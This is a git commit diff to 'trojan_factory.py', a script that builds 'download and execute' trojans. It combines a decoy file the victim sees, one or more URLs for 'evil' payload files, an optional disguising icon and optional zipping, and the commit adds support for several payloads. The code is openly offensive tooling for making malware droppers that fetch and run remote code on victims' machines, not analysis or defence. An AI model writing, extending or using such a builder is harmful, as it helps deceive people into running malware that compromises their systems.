bc611075e9ea033ae771a088d3299b731323ba95
moodule <moodule@protonmail.com>
2020-09-06 13:21:27 +0200

    Compile the trojan with any number of files

--- trojan_factory.py
+++ trojan_factory.py
@@ -1,19 +1,20 @@
 #!/usr/bin/env python
 
 import argparse
+from _argparse import ExtendAction
 from Trojan import *
 
 parser = argparse.ArgumentParser(description='Generate a "download and execute" trojan with the given files.')
 parser.add_argument('-f', '--front-file', required=True, nargs=1, dest='front_file_url', help='Direct URL to file that the user will see.')
-parser.add_argument('-e', '--evil-file', required=True, nargs=1, dest='evil_file_url', help='Direct URL to the evil file file.')
+parser.add_argument('-e', '--evil-file', required=True, nargs='+', dest='evil_file_urls', help='Direct URL to the evil file file.', action=ExtendAction)
 parser.add_argument('-o', '--out-file', required=True, nargs=1, dest='out_file_path', help='Location to store the result.')
 parser.add_argument('-i', '--icon', required=False, nargs=1, dest='icon_path', help='Trojan icon.', default=None)
 parser.add_argument('-z', '--zip', required=False, dest='zip', help='Zip trojan?', action="store_true", default=False)
 args= parser.parse_args()
 
-trojan = Trojan(args.front_file_url[0], args.evil_file_url[0], args.icon_path, args.out_file_path[0])
+trojan = Trojan(args.front_file_url, args.evil_file_urls, args.icon_path, args.out_file_path[0])
 trojan.create()
 trojan.compile()
 
 if args.zip: 
-	trojan.zip(args.out_file_path)
+	trojan.zip(args.out_file_path[0])
